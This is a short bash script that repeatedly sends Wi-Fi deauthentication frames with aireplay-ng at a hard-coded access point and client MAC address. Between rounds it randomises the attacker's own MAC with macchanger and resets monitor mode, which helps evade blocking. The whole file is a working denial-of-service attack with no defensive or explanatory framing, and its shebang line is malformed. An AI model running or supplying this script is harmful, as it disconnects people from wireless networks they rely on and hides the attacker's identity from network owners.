#/bin/bash
#created By Islam Hakim|EIP
while true
do
   aireplay-ng -0 6 -a 58:D7:59:77:22:F8 -c 98:3B:16:A9:17:71   wlan0
   ifconfig wlan0 down
   macchanger -r wlan0 |grep "New MAC"
   iwconfig wlan0 mode monitor
   ifconfig wlan0 up
   iwconfig wlan0|grep Mode
   sleep 3
   echo waitting EIP Man !!!!!!
done
